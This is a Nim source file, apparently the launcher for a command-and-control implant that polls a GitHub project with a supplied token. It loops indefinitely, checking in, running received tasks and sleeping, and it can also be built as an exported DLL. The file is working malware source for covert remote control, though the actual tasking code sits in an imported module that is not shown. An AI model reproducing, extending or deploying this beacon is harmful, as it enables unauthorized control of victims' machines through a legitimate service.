import algorithm
import asyncdispatch
import base64
import json
import std/os

import BeaconGithub


proc error*(message: string, exception: ref Exception) =
    echo message
    echo exception.getStackTrace()


when appType == "lib":
  {.pragma: rtl, exportc, dynlib, cdecl.}
else:
  {.pragma: rtl, }


proc main() {.async, rtl.} = 

    if paramCount() != 2:
        echo "Usage: BeaconGithubLauncher <project> <token>"
        return

    var project = paramStr(1)
    var token = paramStr(2)

    var beaconGithub = BeaconGithub()
    beaconGithub.initBeaconGithub(project, token)
    
    while true:
        try:
          beaconGithub.checkIn()

          beaconGithub.runTasks()

        except:
          let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
          echo "Inside checkIn, got exception ", repr(e), " with message ", msg
          error("stacktrace", e)

        await sleepAsync(beaconGithub.sleepTimeMs)


when appType != "lib":
    waitFor main()
